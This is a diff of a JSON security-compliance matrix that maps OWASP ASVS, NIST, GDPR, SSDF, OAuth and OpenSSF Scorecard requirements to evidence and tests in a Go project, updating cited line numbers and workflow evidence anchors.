         "TestASVS_V10_5_4_IDTokenAudienceIsCheckedAgainstTheClientID"
@@ -4649,14 +4650,14 @@
       ],
       "status": "Met",
       "evidence": [
-        "internal/handler/oauth.go:735"
+        "internal/handler/oauth.go:753"
       ],
       "tests": [
         "TestASVS_V14_2_1_NoRouteCarriesACredentialInItsPath",
         "TestNIST_TokenNotInURL",
         "TestASVS_V3_1_1_RefreshTokenNotInURL"
       ],
-      "notes": "No credential appears in any route pattern or query string. The OAuth callback carries a single-use exchange code in the URL fragment (internal/handler/oauth.go:735), which browsers do not send to the server and no proxy or access log records; the access token itself is never in the redirect at all, it is held in the cache under the hash of that code and collected by POST /auth/oauth2/exchange."
+      "notes": "No credential appears in any route pattern or query string. The OAuth callback carries a single-use exchange code in the URL fragment (internal/handler/oauth.go:753), which browsers do not send to the server and no proxy or access log records; the access token itself is never in the redirect at all, it is held in the cache under the hash of that code and collected by POST /auth/oauth2/exchange."
     },
     {
       "standard": "OWASP ASVS",
@@ -4712,13 +4713,13 @@
       "status": "Met",
       "evidence": [
         "internal/audit/audit.go:295",
-        "internal/audit/retention.go:84"
+        "internal/audit/retention.go:141"
       ],
       "tests": [
         "TestASVS_V16_2_5_AuditMetadataScrubsCredentialKeys",
         "TestGDPR_Art17_3_AuditExemptionIsBoundedByRetention"
       ],
-      "notes": "Scrubbing, retention and access control are implemented as documented for each class. Retention.Sweep (internal/audit/retention.go:84) is the mechanised half, and migration 032 batches it so a long horizon does not lock the table."
+      "notes": "Scrubbing, retention and access control are implemented as documented for each class. Retention.Sweep (internal/audit/retention.go:141) is the mechanised half, and migration 032 batches it so a long horizon does not lock the table."
     },
     {
       "standard": "OWASP ASVS",
@@ -4798,7 +4799,7 @@
       "status": "Met",
       "evidence": [
         "SECURITY.md",
-        ".github/workflows/nightly-security.yml## introduce a HIGH CVE that only surfaces on main at 03:00 the next day."
+        ".github/workflows/nightly-security.yml#introduce a HIGH CVE that only surfaces on main at 03:00 the next day."
       ],
       "tests": [
         "TestOWASP_A03_2025_ReleasePipelineProducesSignedProvenance"
@@ -4820,7 +4821,7 @@
       ],
       "status": "Met",
       "evidence": [
-        ".github/workflows/release.yml## reading is done. Jobs that have to treat a candidate differently,"
+        ".github/workflows/release.yml#reading is done. Jobs that have to treat a candidate differently,"
       ],
       "tests": [
         "TestOWASP_A03_2025_ReleasePipelineProducesSignedProvenance"
@@ -6107,13 +6108,13 @@
       "requirement": "Audit Log Storage Capacity",
       "status": "Met",
       "evidence": [
-        "internal/audit/retention.go:84"
+        "internal/audit/retention.go:141"
       ],
       "tests": [
         "TestASVS_V16_5_3_CriticalAuditEventsAreExemptFromBufferDrop",
         "TestNIST80053_AU_11_RetentionIsMechanisedAndOffByDefault"
       ],
-      "notes": "Buffer overflow is counted and exempts critical events; retention bounds growth when configured. Retention.Sweep (internal/audit/retention.go:84) performs it, batched by migration 032 so a long horizon does not hold a lock across the whole table."
+      "notes": "Buffer overflow is counted and exempts critical events; retention bounds growth when configured. Retention.Sweep (internal/audit/retention.go:141) performs it, batched by migration 032 so a long horizon does not hold a lock across the whole table."
     },
     {
       "standard": "NIST SP 800-53",
@@ -6176,13 +6177,13 @@
       "requirement": "Audit Record Retention",
       "status": "Met",
       "evidence": [
-        "internal/audit/retention.go:84"
+        "internal/audit/retention.go:141"
       ],
       "tests": [
         "TestNIST80053_AU_11_RetentionIsMechanisedAndOffByDefault",
         "TestGDPR_Art5_1_e_RetentionDisabledByDefault"
       ],
-      "notes": ". Retention.Sweep (internal/audit/retention.go:84) performs it, batched by migration 032 so a long horizon does not hold a lock across the whole table."
+      "notes": ". Retention.Sweep (internal/audit/retention.go:141) performs it, batched by migration 032 so a long horizon does not hold a lock across the whole table."
     },
     {
       "standard": "NIST SP 800-53",
@@ -6486,7 +6487,7 @@
       "requirement": "Provenance",
       "status": "Met",
       "evidence": [
-        ".github/workflows/release.yml## starting with the floating image tags, take the answer from here"
+        ".github/workflows/release.yml#starting with the floating image tags, take the answer from here"
       ],
       "tests": [
         "TestOWASP_A03_2025_ReleasePipelineProducesSignedProvenance"
@@ -6549,7 +6550,7 @@
       "requirement": "Software Supply Chain Failures",
       "status": "Met",
       "evidence": [
-        ".github/workflows/release.yml## starting with the floating image tags, take the answer from here"
+        ".github/workflows/release.yml#starting with the floating image tags, take the answer from here"
       ],
       "tests": [
         "TestOWASP_A03_2025_ReleasePipelineProducesSignedProvenance",
@@ -6715,14 +6716,14 @@
       "requirement": "Storage limitation",
       "status": "Met",
       "evidence": [
-        "internal/audit/retention.go:84"
+        "internal/audit/retention.go:141"
       ],
       "tests": [
         "TestGDPR_Art5_1_e_RetentionDisabledByDefault",
         "TestGDPR_Art5_1_e_RecoveryEscrowRetentionDisabledByDefault",
         "TestGDPR_Art17_3_AuditExemptionIsBoundedByRetention"
       ],
-      "notes": ". Retention.Sweep (internal/audit/retention.go:84) performs it, batched by migration 032 so a long horizon does not hold a lock across the whole table."
+      "notes": ". Retention.Sweep (internal/audit/retention.go:141) performs it, batched by migration 032 so a long horizon does not hold a lock across the whole table."
     },
     {
       "standard": "GDPR",
@@ -6983,7 +6984,7 @@
       "requirement": "OAuth 2.0 Security BCP: OIDC nonce binding",
       "status": "Met",
       "evidence": [
-        "internal/oauth2/oidc_idtoken.go:83"
+        "internal/oauth2/oidc_idtoken.go:95"
       ],
       "tests": [
         "TestRFC9700_4_5_3_OIDCNonceBinding",
@@ -7124,7 +7125,7 @@
       "requirement": "OpenID Connect: ID token validation",
       "status": "Met",
       "evidence": [
-        "internal/oauth2/oidc_idtoken.go:57"
+        "internal/oauth2/oidc_idtoken.go:69"
       ],
       "tests": [
         "TestASVS_V10_5_4_IDTokenAudienceIsCheckedAgainstTheClientID",
@@ -7404,7 +7405,7 @@
       "status": "Met",
       "evidence": [
         ".github/workflows/ci.yml#in:test:go-version-file: go.mod",
-        ".github/workflows/nightly-security.yml## `github.ref` and `github.event_name` all resolve to the CALLER's. A group"
+        ".github/workflows/nightly-security.yml#`github.ref` and `github.event_name` all resolve to the CALLER's. A group"
       ],
       "tests": [
         "TestSSDF_800_218_ReleaseIntegrityMechanismsArePresent",
@@ -7421,7 +7422,7 @@
       "status": "Met",
       "evidence": [
         ".github/dependabot.yml:1",
-        ".github/workflows/nightly-security.yml## false on workflow_call, so no pull request ever scanned an image: a"
+        ".github/workflows/nightly-security.yml#false on workflow_call, so no pull request ever scanned an image: a"
       ],
       "tests": [
         "TestSSDF_800_218_DependencyUpdateAutomationIsAutomated",
@@ -7773,7 +7774,7 @@
       "requirement": "Perform the code review and/or code analysis based on the organization's secure coding standards",
       "status": "Met",
       "evidence": [
-        ".github/workflows/nightly-security.yml## Cancellation is on for the nightly, which should never queue behind its own"
+        ".github/workflows/nightly-security.yml#Cancellation is on for the nightly, which should never queue behind its own"
       ],
       "tests": [
         "TestSSDF_800_218_EveryCitedPracticeIsAutomated",
@@ -7857,7 +7858,7 @@
       "requirement": "Gather information from software acquirers, users and public sources on potential vulnerabilities",
       "status": "Met",
       "evidence": [
-        ".github/workflows/nightly-security.yml## false on workflow_call, so no pull request ever scanned an image: a",
+        ".github/workflows/nightly-security.yml#false on workflow_call, so no pull request ever scanned an image: a",
         ".github/workflows/nightly-security.yml#run: go install github.com/securego/gosec/v2/cmd/gosec@v2.28.0"
       ],
       "tests": [
@@ -7873,7 +7874,7 @@
       "requirement": "Review, analyze and/or test the software's code to identify or confirm the presence of previously undetected vulnerabilities",
       "status": "Met",
       "evidence": [
-        ".github/workflows/nightly-security.yml## Cancellation is on for the nightly, which should never queue behind its own",
+        ".github/workflows/nightly-security.yml#Cancellation is on for the nightly, which should never queue behind its own",
         ".github/workflows/nightly-security.yml#- name: Run gosec (production code)"
       ],
       "tests": [
@@ -8264,7 +8265,7 @@
       "requirement": "This check determines whether the project's GitHub Action workflows has dangerous code patterns.",
       "status": "Met",
       "evidence": [
-        ".github/workflows/commitlint.yml## The two SHAs were interpolated straight into the run body. They are"
+        ".github/workflows/commitlint.yml#The two SHAs were interpolated straight into the run body. They are"
       ],
       "tests": [
         "TestScorecard_TokenPermissionsAreLeastPrivilege"
